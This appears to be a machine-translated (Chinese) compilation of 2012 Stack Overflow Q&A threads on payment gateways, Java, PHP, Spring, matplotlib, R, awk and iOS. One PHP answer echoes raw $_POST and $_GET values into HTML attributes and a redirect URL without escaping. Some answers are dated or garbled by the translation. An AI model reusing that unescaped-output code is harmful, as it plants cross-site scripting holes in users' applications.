> 
> 标签：ruby-on-rails-3.2, authorize.net, activemerchant

我已经使用有效的支付网关部署了我的实时应用程序，但我仍然需要在某个地方进行测试，因此使用 sandbox.authorize.net 创建了一个帐户并获得了一个新的 api 密钥。

现在，当我在开发/登台中尝试这些细节时，我得到 -

```
User authentication failed due to invalid authentication values 
```

访问 authorize.net 时

活跃的商家是否与 sandbox.authorize.net 一起使用？测试似乎在测试模式下设置的网关可以正常工作，但不能使用沙盒帐户。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T16:50:14.473

我设法使用以下代码使其工作：

```
ActiveMerchant::Billing::Base.mode = :test
ActiveMerchant::Billing::AuthorizeNetCimGateway.new( 
  :login => login, 
  :password => password
) 
```

最初我的连接器看起来像这样（如 api 所示）：

```
ActiveMerchant::Billing::AuthorizeNetCimGateway.new( 
  :login =>    login, 
  :password => password,
  :test        true
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-26T11:29:56.747

这可能是因为测试模式使用您的真实帐户的测试模式，并且实际上并不指向 Authnet 的开发服务器。我不知道 Active Merchant 是如何编写的，但它可能需要您手动更改 URL 以进行测试，然后在测试完成后返回其原始值。

# java - 系统托盘图标，添加“点击这里”链接

> ID：11651323
> 
> 赞同：1
> 
> 时间：2012-07-25T13:52:56.773
> 
> 标签：java, system, awt, tray

我有以下代码来打开窗口通知，但我希望显示“单击此处”的部分链接到文本文件。如何将此功能添加到托盘图标中？

```
public class foundDocs implements ActionListener {

public static void main(String[]args) throws AWTException
{
    new foundDocs();
}
foundDocs() throws AWTException 
   { 
       SystemTray tray = SystemTray.getSystemTray(); 
        java.awt.Image image = Toolkit.getDefaultToolkit().getImage("tray.gif"); 
        TrayIcon trayIcon = new TrayIcon(image, "Tray Demo"); 
        tray.add(trayIcon); 
        trayIcon.displayMessage("Found new document associations:", "Click here to view", MessageType.INFO); 
        trayIcon.addActionListener(this);
    }

@Override
public void actionPerformed(ActionEvent arg0) 
{
    // display the text file in the default app. 
    try {
        Desktop.getDesktop().open(new File("Users.txt"));
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } 

} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:06:01.200

[在`ActionListener`](http://docs.oracle.com/javase/7/docs/api/java/awt/TrayIcon.html#addActionListener%28java.awt.event.ActionListener%29)`TrayIcon`. _ 在事件中，使用类似的东西：

```
// display the text file in the default app.
Desktop.getDesktop().open(new File("the.txt")); 
```

# php - 在网页中显示本地 ip

> ID：11651325
> 
> 赞同：0
> 
> 时间：2012-07-25T13:53:00.083
> 
> 标签：php, javascript, python-2.7

> **可能重复：**
> [服务器如何找到真实的客户端 IP 地址？](https://stackoverflow.com/questions/5371020/how-can-a-server-find-real-client-ip-address)

我需要让我的用户非常快速轻松地找到他们的本地（LAN）IP。

我们的网络有一个 squid 代理，所以所有用户都坐在它后面（这是内部 ip 检测的问题：我尝试过的所有 php 脚本都能够 - 充其量 - 检测代理的 ip 而不是客户端的）。

欢迎在 LAMP 服务器上使用任何类型的语言...

Windows上的一个简单的EXE文件也可以作为“计划b”工作，但我找不到任何工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:03:42.443

考虑在浏览器中加载的 java 小程序。由于 java 使用它自己的虚拟环境，它将能够向客户端显示本地 IP 地址。

我猜是开始的好方法-> [http://reglos.de/myaddress/MyAddress.html](http://reglos.de/myaddress/MyAddress.html)

* * *

Java 获取 IP：[如何检查 Java 中的系统 IP 地址/主机名？](https://stackoverflow.com/questions/4536068/how-can-i-check-system-ip-address-host-name-in-java)

这样你就不必改变当前的环境。否则它可能会涉及 squid 重新配置。

* * *

从您发布的评论中，我可以看到将 IP 呈现给客户端的目的是让他们向您阅读并允许您远程连接。您还提到在客户端运行应用程序是一种选择。这立即将我推向 BGInfo [http://technet.microsoft.com/en-us/sysinternals/bb897557.aspx](http://technet.microsoft.com/en-us/sysinternals/bb897557.aspx) - 特别是如果客户端操作系统是 Windows。

* * *

放置在页面上的简单 Java aplet：

```
function myIP(){ var vi="uses java to get the users local ip number"
    var yip2=java.net.InetAddress.getLocalHost();   
    var yip=yip2.getHostAddress();
  return yip;
}//end myIP

alert("your machine's local network IP is "+ myIP()) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:27:02.110

在@German Arlington 的回答之后，我认为您最好的选择是[配置 Squid](http://www.squid-cache.org/Doc/config/forwarded_for/)以将`X-Forwarded-For`标头与 HTTP 请求一起发送：

> 如果设置为“on”，Squid 将在它转发的 HTTP 请求中附加您客户端的 IP 地址。默认情况下，它看起来像：
> 
> ```
> X-Forwarded-For: 192.1.2.3 
> ```

然后您将能够通过[apache_request_headers()读取 PHP 中的 IP 地址](http://www.php.net/manual/en/function.apache-request-headers.php)

```
<?php
$headers = apache_request_headers();
echo $headers["X-Forwarded-For"];
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:04:13.740

你可能感兴趣

[http://roshanbh.com.np/2007/12/getting-real-ip-address-in-php.html](http://roshanbh.com.np/2007/12/getting-real-ip-address-in-php.html)

并且通常在应该包含您要查找的信息的 http 标头中

# spring - 如何在 Spring 中定义 contextParameter

> ID：11651337
> 
> 赞同：0
> 
> 时间：2012-07-25T13:53:16.913
> 
> 标签：spring, properties, junit

我正在开发一个 Web 项目，并在我的 Tomcat 的 context.xml 中定义了一些属性，例如路径、应用程序配置的属性值。当我想编写一些在我的 Web 容器之外启动的 JUnit 测试时，我的问题就来了，我该如何定义这些参数？需要明确的是，在我的 context.xml 中（在 Tomcat 配置目录中），我有：

```
<Parameter name="myProperty" value="myValue" override="false"/> 
```

使用 Spring，我可以通过以下方式访问它：

```
<property name="property" value="#{myProperty}" /> 
```

但是当我启动 junit 测试时，没有加载 context.xml，我需要另一种方法来定义属性。我怎样才能做到这一点？更准确地说，我们所说的 context.xml 文件是我的 Tomcat 服务器使用的文件，它不遵循 Spring 模式，我认为我不能将它“导入”到 Spring 中。我已经使用了 SpringJUnit4ClassRunner 和 ContextConfiguration 标签，它工作正常，但现在，我需要模拟/替换 Tomcat 的行为来定义这个 ContextParameters 并检索我的参数......

我希望我更清楚:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:04:14.550

尝试使用这样的东西：

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration("classpath:context.xml")
public class MyTestClass {

//put tests here

} 
```

**编辑：**

您还可以指定上下文文件的路径：

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration("file:src/main/resources/spring/config.xml")
public class MyTestClass {

//put tests here

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-26T00:27:38.993

要使上述建议起作用，您需要依赖 spring-test 模块。

您还可以以良好的老式方式加载您的上下文文件。

```
ApplicationContext context = new ClassPathXmlApplicationContext("context.xml") 
```

然后按名称获取您的 bean。

# python - 在 x 轴上显示索引表示的值

> ID：11651340
> 
> 赞同：0
> 
> 时间：2012-07-25T13:53:19.503
> 
> 标签：python, matplotlib

我有制作二维数组图的代码。沿着 x 轴只是我的数组的索引，但我希望 x 轴显示索引所代表的值。

相关代码：

```
plt.imshow(data, aspect="auto")
plt.colorbar()
plt.show() 
```

其中“数据”是一个 1000 x 200 的数组。所以此刻，绘图已正确创建，x 轴显示数组的索引号（0-199）。

但是这个索引也对应于另一个列表中的一个日期，我有长度为 200 的 (date[])。我希望与索引对应的日期显示在 x 轴上，而不是索引本身。

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T15:14:47.843

要放置 x-ticks 和您可以使用的标签

```
plt.xticks(range(200),date) 
```

但是上面会放太多的刻度和标签。如果您想将刻度数减少到 5，您可以使用

```
idx=np.linspace(0,199,5).astype('int')
plt.xticks(idx,[date[i] for i in idx]) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:37:10.503

您是否编写了 imshow() 方法，或者是库的一部分？如果是你的，只需添加一行，为每个 x 获取 date[x] 值。

如果该方法是库的一部分，您也许可以解决其他问题，尽管我需要了解更多信息。

# javascript - 如何让 OR 运算符在这个 JavaScript 数组中工作

> ID：11651343
> 
> 赞同：1
> 
> 时间：2012-07-25T13:53:26.300
> 
> 标签：javascript, arrays

几个月来，我一直在断断续续地解决这个问题。是否可以将**“OR”运算符**应用于下面的这个数组结构？

基础知识：如果下拉列表中的值与数组中的值匹配，则将相应的 ID 发送到函数并执行其他操作，但我无法添加/包含**OR 运算符**。

例如我希望能够在代码中说：

```
{id : '418', value: 'Brochure' || 'Broc'},
{id : '546', value: 'Classified Ad' || 'CA' || 'Class Ad'}, 
```

但是上面的方法从来没有用过，所以我不知道是不能完成还是我的语法错误。

任何见解将不胜感激。

* * *

**找到值后运行的函数**

```
var projectTypes = [{
    "id": "418",
    "value": ["Brochure", "Broc"]
  }, {
    "id": "546",
    "value": ["Classified Ad", "CA", "Class Ad"]
  }, {
    "id": "254",
    "value": ["Flyer", "Flyers"]
  }, {
    "id": "855",
    "value": "Post Card"
  }];

function projectTypeChange() {
    var project_type = document.getElementById(projectType_Field_Id).value;
    SwitchBox(project_type);
}

function SwitchBox(selectedType) {
    for (var i = 0; i < projectTypes.length; i++) {
        if (projectTypes[i].value.indexOf(projectTypes) >= 0)
        //if (projectTypes[i].value == selectedType)
        {
            document.getElementById("section-" + projectTypes[i].id).style.display = '';
        } else {
            document.getElementById("section-" + projectTypes[i].id).style.display = 'none';
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T13:59:04.600

而不是尝试使用 || 运算符（在这种情况下不正确），使值成为自己的数组：

```
{ id: '418', value: ['Brochure','Broc'] },
{ id: '546', value: ['Classified Ad','CA','Class Ad'] } 
```

然后不是检查值是否相等，而是检查 indexOf 以查看该值是否在数组中：

```
if(value.indexOf(someVal) >= 0)
{
    // someVal was found in the value array...do the work!
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-26T00:41:50.263

按照贾斯汀的建议去做。在 indexof 代码中更改此行：

```
if(projectTypes[i].value.indexOf(projectTypes) >= 0) 
```

对此：

```
if(projectTypes[i].value.indexOf(selectedType) >= 0) 
```

# android - Facebooks 的过期日期为 0

> ID：11651344
> 
> 赞同：0
> 
> 时间：2012-07-25T13:53:27.540
> 
> 标签：android, facebook-graph-api

我刚刚意识到我没有得到有关访问令牌到期日期的更多信息。准确地说，我说的是 facebook SDK for android，我在`authorize()`其中使用回调调用该方法，`DialogListener`如下面的代码所示。

我已经好几个星期没看它了，我知道它以前可以工作，现在当我回到项目时，我发现`facebook.getAccessExpires()`每次都返回 0 的调用。

我的第一个想法是 API 可能被破坏并且应用了一些我没有注意到的更改。然而，使用大约相同年龄的 iPhone 项目，它似乎收到了一个到期日期。（从我缺乏objective-c技能的情况来看^^）。

接下来，我`5a72863793521a96f5a9f4fb72960a27b98e441d`从[facebook 的 github 上](https://github.com/facebook/facebook-android-sdk/commits/master)查看了提交，因为我大约在这个时候开始实现支持 FB，并认为这样我可能会看到 SDK 是否以某种戏剧性的方式发生了变化。

到目前为止，我所有的努力都是徒劳的，我想不出一个很好的理由来追踪这个错误。

```
DialogListener dialogListener = new DialogListener(){
    @Override
    public void onComplete(Bundle values) {
        mPrefsEdit.putString(USER_ACCESS_TOKEN, facebook.getAccessToken() )
                  .putLong(USER_ACCESS_EXPIR, facebook.getAccessExpires() )
                  .commit();
        }
   //other required overrides
}

Facebook facebook = new Facebook(APP_ID);    
facebook.authorize(activity, APP_PERMISSIONS, Facebook.FORCE_DIALOG_AUTH, dialogListener); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:01:47.843

facebook 停止提供`offline access token permission`. 因此访问令牌将在非常排序的时间内有效（2-8 小时）。有关更多详细信息，请参阅[Facebook 博客](https://developers.facebook.com/roadmap/offline-access-removal/)。

`facebook.getAccessExpires()`这是始终返回 0的主要原因。

# r - 由 require(gWidgetstcltk) 引起的无限循环

> ID：11651352
> 
> 赞同：1
> 
> 时间：2012-07-25T13:53:49.170
> 
> 标签：r, gwidgets

当 I 时`require(gWidgetstcktk)`，我得到一个无限循环，其中包含看似无穷无尽的错误消息，如下所示：

```
error reading package index file /Library/Frameworks/R.framework/Versions/2.14/Resources/library/tcltk2/tklibs/ttktheme_clearlooks/pkgIndex.tcl: can't find package tile
error reading package index file /Library/Frameworks/R.framework/Versions/2.14/Resources/library/tcltk2/tklibs/ttktheme_clearlooks/pkgIndex.tcl: too many nested evaluations (infinite loop?) 
```

（在每次迭代中，路径都是不同的。这些消息的结尾似乎是重要的部分：`can't find package tile`和`too many nested evaluations (infinite loop?)`

我像往常一样安装了软件包，`install.package()`并且引用的文件似乎存在。`gWidgets`似乎加载得很好。我在 OSX 10.7.4 上通过 RStudio 0.96.231 运行 R 2.14.1。这里出了什么问题？

* * *

更新：我现在看到问题出在`tcltk2`包上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:40:35.927

那不应该发生。首先，我会说尝试卸载软件包然后重新安装它。过程中可能出现错误。您应该做的另一件事是在执行此操作（或）时选择“安装所有依赖项” `install.packages(______, dependencies = TRUE)`。您是否安装了该软件包的所有相关依赖项？也许这个库需要一个你没有的不同的库。

# c# - MVC3 AntiForgeryToken相关问题，深入框架

> ID：11651354
> 
> 赞同：0
> 
> 时间：2012-07-25T13:53:51.953
> 
> 标签：c#, .net, asp.net-mvc-3, antiforgerytoken

我在 .Net 4 和 IIS6（Win2003 服务器）上运行 MVC3 Web 应用程序。我们可以间歇性地捕获以下错误消息：

```
System.ArgumentException: Value cannot be null or an empty string.
Parameter name: serializedToken
   at System.Web.Helpers.AntiForgeryDataSerializer.Deserialize(String serializedToken)
   at System.Web.Helpers.AntiForgeryWorker.GetAntiForgeryTokenAndSetCookie(HttpContextBase httpContext, String salt, String domain, String path)
   at System.Web.Helpers.AntiForgeryWorker.GetHtml(HttpContextBase httpContext, String salt, String domain, String path)
   at System.Web.Helpers.AntiForgery.GetHtml(HttpContextBase httpContext, String salt, String domain, String path)
   at System.Web.Mvc.HtmlHelper.AntiForgeryToken(String salt, String domain, String path)
   at System.Web.Mvc.HtmlHelper.AntiForgeryToken()
   at ASP._Page_Views_Introduction_GetStarted_cshtml.Execute() in d:\MyProject\Views\ControllerName\ViewName.cshtml:line 43
   at System.Web.WebPages.WebPageBase.ExecutePageHierarchy()
   at System.Web.Mvc.WebViewPage.ExecutePageHierarchy()
   at System.Web.WebPages.StartPage.RunPage()
   at System.Web.WebPages.StartPage.ExecutePageHierarchy()
   at System.Web.WebPages.WebPageBase.ExecutePageHierarchy(WebPageContext pageContext, TextWriter writer, WebPageRenderingBase startPage)
   at System.Web.Mvc.RazorView.RenderView(ViewContext viewContext, TextWriter writer, Object instance)
   at System.Web.Mvc.BuildManagerCompiledView.Render(ViewContext viewContext, TextWriter writer)
   at System.Web.Mvc.ViewResultBase.ExecuteResult(ControllerContext context)
   at System.Web.Mvc.ControllerActionInvoker.InvokeActionResult(ControllerContext controllerContext, ActionResult actionResult)
   at System.Web.Mvc.ControllerActionInvoker.<>c__DisplayClass1c.<InvokeActionResultWithFilters>b__19()
   at System.Web.Mvc.ControllerActionInvoker.InvokeActionResultFilter(IResultFilter filter, ResultExecutingContext preContext, Func`1 continuation)
   at System.Web.Mvc.ControllerActionInvoker.<>c__DisplayClass1c.<>c__DisplayClass1e.<InvokeActionResultWithFilters>b__1b()
   at System.Web.Mvc.ControllerActionInvoker.InvokeActionResultWithFilters(ControllerContext controllerContext, IList`1 filters, ActionResult actionResult)
   at System.Web.Mvc.ControllerActionInvoker.InvokeAction(ControllerContext controllerContext, String actionName) 
```

在视图中我们有代码

```
 using (Html.BeginForm("ActionName", "ControllerName"))
    { 
        @Html.AntiForgeryToken()
        ... other codes ...
    } 
```

接收动作方法看起来像

```
 [HttpPost]
    [ValidateAntiForgeryToken]
    public ActionResult ActionName()
    {
        // other logic here

        return RedirectToAction("Something", "Something");
    } 
```

我认为编码应该是正确的。有没有人经历过类似的事情？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-29T18:04:08.313

在我编写了一些使 cookie 无效而不是删除它们的 cookie 清除代码后，我得到了这个异常。**当RequestVerificationToken** cookie 为空白时，AntiForgeryToken() 似乎失败（即使是在 GET 请求中） 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-29T14:00:27.653

尝试从浏览器中删除所有 cookie。也可以在隐身模式下尝试浏览器或其他浏览器。我有同样的问题。不碰饼干，这发生了。看来问题是由系统还原和 Windows 密码更改引起的。疯狂的..

# actionscript-3 - Wonderputt，定制引擎或重复使用的引擎

> ID：11651357
> 
> 赞同：0
> 
> 时间：2012-07-25T13:54:08.303
> 
> 标签：actionscript-3

像我猜的许多其他人一样，我遇到了精彩的“wonderputt”游戏（[http://www.dampgnat.com/wonderputt](http://www.dampgnat.com/wonderputt)）

我想知道是否有人知道它是如何制作的。他们是使用 box2d 之类的引擎还是使用了自己的引擎？他们是使用 Stage3D 功能还是预渲染 grafix？

非常感谢任何信息，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T17:05:32.220

您可以在自己的作者的[开发日记](http://www.dampgnat.com/wonderputtwip)中找到很多关于**Wonderputt**是如何开发的信息。显然，他们使用了为他们的另一个游戏[Adverputt](http://www.adverputt.com/)构建的自定义框架。

在这些采访中可以找到更多有用的信息：

[http://truepcgaming.com/2011/09/12/delightfully-addicting-mini-golf-wonderputt-interview/](http://truepcgaming.com/2011/09/12/delightfully-addicting-mini-golf-wonderputt-interview/)

[http://mochiland.com/articles/flash-game-friday-winner-wonderputt](http://mochiland.com/articles/flash-game-friday-winner-wonderputt)

希望这可以帮助！

# python - 用计数器迭代文件名

> ID：11651360
> 
> 赞同：0
> 
> 时间：2012-07-25T13:54:29.043
> 
> 标签：python, counter

我正在根据字符串拆分文件，并希望对输出文件名进行编号。

这是我到目前为止所拥有的：

```
outputfile = open("output.seq")   
outputfileContent = outputfile.read()
outputfileList = outputfileContent.split(">")
for count, line in enumerate(f):
    for items in outputfileList:
        seqInfoFile = open('%f.dat', 'w')
    seqInfoFile.write(str(items)) 
```

我不确定在哪里定义 f。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T13:59:09.423

假设我没有误解你，你有它。

```
outputfile = open("output.seq")   
outputfileContent = outputfile.read()
outputfileList = outputfileContent.split(">")

for count, content in enumerate(outputfileList, 1):
    with open("output_%s.dat" % count, "w") as output:
        output.write(content) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T13:57:38.607

看起来，如果您想将输出文件列表中的每个项目与标题为索引的文件相关联，您应该执行以下操作：

```
for i in range(len(outputfileList)):
    seqInfoFile = open(str(i) + '.dat', 'w')
    seqInfoFile.write(str(outputfileList[i])) 
```

它不像迭代器那么优雅，但另一种选择是通过每次调用 outputfileList.index(items) 来确定数字。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T13:59:33.597

打开`output.seq`，将其第一行（在 处`>`拆分）写入文件`1.dat`，第二行写入`2.dat`，依此类推：

```
with open("output.seq") as fi:
    for count, line in enumerate(fi, 1):
        with open('{0}.dat'.format(count), 'w') as fo:
            fo.writelines(line.split('>')) 
```

# jpa - jpql sql在同一个事务中

> ID：11651362
> 
> 赞同：0
> 
> 时间：2012-07-25T13:54:32.697
> 
> 标签：jpa, plsql, oracle11g, ejb-3.0, jboss6.x

实际上，我在调用存储过程并在同一事务中对数据库进行一些更改时遇到了问题。我正在做的是我使用 jpql 将来自 en EJB (3.0) 的一些数据插入到 oracle 数据库中，然后我使用本机 jpa 查询调用存储过程来对新数据进行一些处理。但问题是，除非我提交事务，否则 PL/SQL 函数看不到更改，然后我进行了我不想做的调用，因为我想将所有更改保留在同一个事务中。所以问题是：有没有办法插入我的数据，调用 pl/sql 函数并在此之后提交所有内容（或最终回滚所有更改）？

谢谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T13:57:36.807

确保`entityManager.flush()`在执行存储过程之前调用。否则，持久性上下文可能仍然在内存中有待处理的更改。刷新确保所有挂起的更改都写入数据库。

如果这不起作用，则意味着存储过程使用的事务与 JPA 使用的事务不同。

# php - 如何在一个节点与其子节点之间的DOM层次结构中插入节点？

> ID：11651365
> 
> 赞同：0
> 
> 时间：2012-07-25T13:54:37.990
> 
> 标签：php, dom

我有一个看起来像这样的 DOM：

```
 div id = main
   div
   div 
```

我想把名为“中间”的 div 像这样：

```
 div id = main
   div id = middle
     div
     div 
```

所以我想将主节点的所有子节点移动到中间节点，中间节点成为主节点的唯一子节点。我试图弄清楚，但我做不到。

我使用这段代码：

```
 $wrapper = $doc->createElement('div');
 foreach($node->childNodes as $child) 
 {
     $node->removeChild($child);
     $wrapper->appendChild($child);
 }
 $node->appendChild($wrapper); 
```

但它不起作用。

如果我这样做：

```
 $wrapper = $doc->createElement('div');
          $children = $node->childNodes;
          for($i = $children->length; $i--;) {
              $child = $children->item($i);
              $node->removeChild($child);
              $wrapper->appendChild($child);
          } 
           $node->appendChild($wrapper); 
```

项目被移动，但顺序相反。

如何在 PHP 中正确执行此操作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:15:56.737

```
 $wrapper = $doc->createElement('div');
          $children = $node->childNodes;
          for($i = 0; $children->length > 0; $i++) {
              $child = $children->item(0);
              $node->removeChild($child);
              $wrapper->appendChild($child);
          } 
           $node->appendChild($wrapper); 
```

# php - php将数据传递给html表单

> ID：11651366
> 
> 赞同：1
> 
> 时间：2012-07-25T13:54:41.783
> 
> 标签：php, html, forms

我有包含变量的 php 文件：

```
$t1 =  $_POST['t1'];
$t2 =  $_POST['t2']; 
```

我需要将这些变量传递到相应的 html 表单字段中：

```
<input id="field_1" type="hidden" name="field_1" />
<input id="field_2" type="hidden" name="field_2" /> 
```

表单位于与带有变量的 php 文件不同的页面中。它的网址是“form.php”

我想我需要在我的 php 文件中创建 php post 命令，该命令重定向到 url“form.php”并将 $t1 和 $t2 加载到各自的表单字段“field_1”和“field_2”中？

尝试但找不到正确的解决方案..任何想法都赞赏 Brgds, Raivis

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T13:57:36.853

```
$t1 =  $_POST['t1'];
$t2 =  $_POST['t2'];

<input id="field_1" type="hidden" name="field_1" value="<?php echo $t1 ?>" />
<input id="field_2" type="hidden" name="field_2" value="<?php echo $t2 ?>" /> 
```

如果表单和值不在同一个文件中，则需要将值从`page1.php`to传递`page2.php`，您可以通过 URI 发送值并从`$_GET`方法中获取它来实现。

假设您有值`page1.php`并希望在重定向时将值发送到`page2.php`，那么您可以在重定向时这样做。

```
$t1 =  $_POST['t1'];
$t2 =  $_POST['t2'];
header('Location: http://yoursite.com/page2.php?t1='.$t1.'&t2='.$t2); 
```

现在，当页面将被重定向到 page2.php 时，您将拥有该值，您可以使用`$_GET`in`page1.php`类似的方式获取它。

```
$t1 =  $_GET['t1'];
$t2 =  $_GET['t2'];

<input id="field_1" type="hidden" name="field_1" value="<?php echo $t1 ?>" />
<input id="field_2" type="hidden" name="field_2" value="<?php echo $t2 ?>" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:09:19.740

您可以使用 POST 将数据传递到其他页面，然后通过带有隐藏字段的表单重新发送 POST 数据。就像一个包含多个步骤的注册过程。

但是为什么不使用会话呢？它更清晰，更容易使用。

1.  form.php，有表单并在提交时会将数据发布到 form2.php
2.  form2.php 接收 POST 数据，检查验证并设置会话变量。
3.  现在，您可以在使用会话时访问站点中的每个位置。

启动和设置会话变量：

```
session_start(); //at top of page

$_SESSION['name_of_field'] = $_POST['name_of_field']; //do checks on the post data! 
```

要使用会话变量：

```
session_start(); //at top of page

$my_new_value = $_SESSION['name_of_field']; 
```

[有关会话](http://www.tizag.com/phpT/phpsessions.php/)的更多信息

# awk - 有没有办法创建一个 awk 输入不活动计时器？

> ID：11651368
> 
> 赞同：1
> 
> 时间：2012-07-25T13:54:46.820
> 
> 标签：awk

我有一个文本源（一个日志文件），它得到一些第三方附加的新行。

我可以使用`tail -f source`. 然后，我可以通过 awk 脚本`awk -f parser.awk`对其进行管道解析和格式化输出。

我的问题是：在`tail -f source | awk -f parser.awk`运行时，有没有办法`function foo()`在我的`parser.awk`脚本中调用，每次超过 5 秒，而没有任何东西通过管道进入 awk 脚本的标准输入？

*编辑：目前使用 GNU Awk 3.1.6。如果需要，可以升级到较新的版本。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:53:07.980

如果你的 shell`read`支持`-t`and `-u`，这里有一个丑陋的 hack：

```
{ echo hello; sleep 6; echo world; } | awk 'BEGIN{ 
    while( "while read -t 5 -u 3 line; do echo \"$line\"; done" | getline > 0 )
        print
    }' 3<&0 
```

您可以将`print`while 循环主体中的 替换为您的脚本。但是，将读取超时放在 tail 和 awk 之间可能更有意义，并且重新实现 tail 到超时会更有意义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:33:26.413

不完全是您问题的答案。然而，shell 中有一个小技巧，几乎可以做你想做的事：

```
{ tail -f log.file >&2 |  { while : ; do sleep 5; echo SECRET_PHRASE ; done ; } ; } 2>&1 | awk -f script.awk 
```

当 awk 收到 SECRET_PHRASE 时，它将`foo`每 5 秒运行一次函数。不幸的是，即使在这段时间内尾部有一些输出，它也会每 5 秒运行一次。

附言。您可以将 '{}' 替换为 '()'，反之亦然。在第一种情况下它不会创建子外壳，在第二种情况下它会。

另一种方法是将这个秘密短语直接附加到日志文件中，以防在最后五秒钟内没有人在那里写信。但看起来这不是一个好主意，因为你会损坏日志文件。

# r - 将函数的输出分配给R中的两个变量

> ID：11651371
> 
> 赞同：7
> 
> 时间：2012-07-25T13:55:02.447
> 
> 标签：r

> **可能重复：**
> [具有多个输出的函数](https://stackoverflow.com/questions/8216470/function-with-multiple-outputs)

这似乎是一个简单的问题，但我无法弄清楚，而且我在看过的 R 手册中也没有运气。我想 find `dim(x)`，但我想在一行中分配`dim(x)[1]`to`a`和`dim(x)[2]`to 。`b`

我试过`[a b] <- dim(x)`and `c(a, b) <- dim(x)`，但都没有奏效。有没有一种方法可以做到这一点？这似乎是一件非常基本的事情，应该很容易处理。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:33:43.950

这可能不像您想要的那样简单，但这可以完成工作。如果您需要一次分配多个变量（并且您不知道您有多少值），它也是将来非常方便的工具。

```
Output <- SomeFunction(x)
VariablesList <- letters[1:length(Output)]
for (i in seq(1, length(Output), by = 1)) {
    assign(VariablesList[i], Output[i])
} 
```

循环不是 R 中最有效的东西，但我已经多次使用它。我个人发现它在从具有未知数量条目的文件夹中收集信息时特别有用。

编辑：在这种情况下，输出可以是任何长度（只要变量列表更长）。

编辑#2：如 Liz 建议的那样，更改了 VariablesList 向量以允许更多值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:41:56.987

您还可以编写自己的函数，该函数将始终生成全局`a`和`b`. 但这是不可取的：

```
mydim <- function(x) {
  out <- dim(x)
  a <<- out[1]
  b <<- out[2]
} 
```

执行此操作的“R”方法是将结果输出为列表或向量，就像内置函数一样，并根据需要访问它们：

```
out <- dim(x)

out[1]

out[2] 
```

R 具有许多其他语言所缺乏的出色的列表和向量理解能力，因此没有这种多重赋值功能。相反，它具有丰富的函数集，可以在没有循环结构的情况下进入复杂的数据结构。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:25:49.853

看起来没有办法做到这一点。真正处理它的唯一方法是添加几行额外的行：

```
temp <- dim(x)
a <- temp[1]
b <- temp[2] 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-07-25T14:03:25.850

这取决于`a`和中的内容`b`。如果它们只是数字，请尝试返回这样的向量：

```
dim <- function(x,y) 
    return(c(x,y))
dim(1,2)[1]
# [1] 1
dim(1,2)[2]
# [1] 2 
```

如果`a`和`b`是别的东西，你可能想返回一个列表

```
dim <- function(x,y)
    return(list(item1=x:y,item2=(2*x):(2*y)))
dim(1,2)[[1]]
[1] 1 2
dim(1,2)[[2]]
[1] 2 3 4 
```

编辑：

试试这个：`x <- c(1,2); names(x) <- c("a","b")`

# ios - 来自 UIView 的 ARC 感知 UIImage

> ID：11651372
> 
> 赞同：1
> 
> 时间：2012-07-25T13:55:04.747
> 
> 标签：ios, memory-management, uiview, uiimage, automatic-ref-counting

我的应用程序遍历 PDF 文件目录，使用 CGPDF API 函数将第一页绘制到屏幕外 UIView 子类中，这使得 UIImage 可用于应用程序。UIView 子类只是添加了*@property (nonatomic,assign) image*，它在其设置器中使用标准方法从 UIView 获取 UIImage，根据 Apple 引用。

UIViewWithImage.h：

```
@interface UIViewWithImage : UIView {
    UIImage* image;
}
@property (nonatomic,strong) UIImage* image;
@end 
```

UIViewWithImage.m:

```
@implementation UIViewWithImage
@dynamic image;
-(UIImage*)image {

    if( [self.layer respondsToSelector:@selector(setShouldRasterize:)])
        UIGraphicsBeginImageContextWithOptions( self.bounds.size, NO, self.contentScaleFactor );
    else
        UIGraphicsBeginImageContext(self.bounds.size);

    [self.layer renderInContext:UIGraphicsGetCurrentContext()];
    image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    return image;
}
@end 
```

到目前为止，一切都很好。我的应用程序使用 ARC（自动引用计数）并在此方法中崩溃，在收到内存警告后不久。没有例外，仪器没有太大帮助，因为我无法观察到内存积累。只有从设置器中删除代码才能使应用程序免于崩溃。

